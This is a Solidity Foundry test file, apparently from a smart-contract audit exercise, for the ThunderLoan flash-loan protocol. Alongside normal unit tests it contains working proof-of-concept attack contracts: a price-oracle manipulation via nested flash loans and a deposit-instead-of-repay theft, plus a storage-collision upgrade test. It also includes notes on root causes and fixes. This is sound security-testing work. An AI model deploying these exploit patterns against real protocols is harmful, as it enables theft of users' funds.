// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console,console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    // if we uncomment the two lines in deposit() then this test will pass
    function test_RedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountOfAssetToken = type(uint256).max;
        // so LP can redeem
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountOfAssetToken); // NOTE: The exchange rate is increased before repayment is
            // verified.
    }

    function testOracleManipulation() public {
        // 1. setUp the contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), ""); // this one used to create the proxy
        BuffMockPoolFactory bmf = new BuffMockPoolFactory(address(weth));
        // Create a Tswap DEX between WETH and TokenA.
        address TswapPool = bmf.createPool(address(tokenA)); // creations of pool for tokenA and WETH
        thunderLoan = ThunderLoan(address(proxy)); // get the thunderLoan contract from the proxy
        thunderLoan.initialize(address(bmf)); //  initialize the contract with the address of the pool factory.

        //2. fund the TSWAP
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(TswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(TswapPool), 100e18);
        BuffMockTSwap(TswapPool).deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();
        // Ratio will be 100 WETH and 100 tokenA
        // price 1:1

        //3. fund the Thunderloan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        //fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // 100 WETH and 100 tokenA in TSwap
        // 1000 tokenA in Thunderloan
        // Take out a flashLoan of 50 TokenA
        // swap it on the dex, tanking the price > 150 TokenA -> ~80 WETH
        // Now take out another flashloan of 50 TokenA and we'll see how much cheaper it is!

        //4. make 2 flash loans
        //  a. To show the price of WETH/TokenA on Tswap
        //  b. To show that doing so greatly reduces the fees on Thunderloan
        uint256 normalFees = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("normalFees", normalFees);
        //  0.296147410319118389

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver mflr = new MaliciousFlashLoanReceiver(
            address(TswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(mflr), 100e18); // increased to 100
        thunderLoan.flashloan(address(mflr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 AttackFee = mflr.feeOne() + mflr.feetwo();
        console.log("AttackFee", AttackFee);
        /// 0.214167600932190305

        assert(AttackFee < normalFees);
        // if i comment out this line   s_currentlyFlashLoaning[token] = false; in Thunderloan then test will pass, but
        // we won't change the contract
    }

    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = 50e18;
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        console.log("tokenA.balanceOf(address(dor))", tokenA.balanceOf(address(dor))); //50.157185829891086986 => 50
            // TokenA in attacker account
        console.log("fee", fee);
        assert(tokenA.balanceOf(address(dor)) > fee); // 0.150000000000000000  => 0.15 eth fees, but attacker's balance
            // is more than the fees , it means that the attack was successful
    }

    function testUpgradeBreaksFee() public setAllowedToken hasDeposits {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), ""); // this will upgrade the contract 
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("Fee before upgrade:", feeBeforeUpgrade);//3000000000000000
        console2.log("Fee after upgrade:", feeAfterUpgrade);// 1000000000000000000
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
}

// THIS IS FOR ORACLE MANIPULATION ..............................................
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool public allowed;
    uint256 public feeOne;
    uint256 public feetwo;

    // 1. Swap TokenA borrowed for WETH
    // 2. Take out a second flash loan to compare fees
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        // Because we're calling two loans, our executeOperation function is going to be called twice. We can prevent
        // issues by creating a mutex lock for the function.
        if (!allowed) {
            feeOne = fee;
            allowed = true;
            uint256 wethbought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // Tanks the price;
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethbought, block.timestamp);
            // takes second flashloan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        } else {
            feetwo = fee;
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        }
    }
}

// Deposit-Instead-of-Repay Flash Loan Bug
//
// The protocol verifies flash loan repayment by checking the pool’s token balance,
// not by tracking explicit repayment logic.
//
// During an active flash loan, `repay()` is blocked, but `deposit()` is still allowed.
// An attacker can deposit the borrowed funds, which:
//   1) restores the pool balance (repayment check passes)
//   2) mints redeemable shares to the attacker
//
// After the flash loan ends, the attacker redeems those shares and withdraws the funds,
// effectively stealing the flash-loaned amount.
//
// Root cause:
// - Balance-based repayment checks
// - Deposits allowed during flash loans
// - Deposits mint future claims
//
// Fix:
// - Block deposits during flash loans OR
// - Track repayment via internal accounting, not balanceOf()

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        s_token.approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
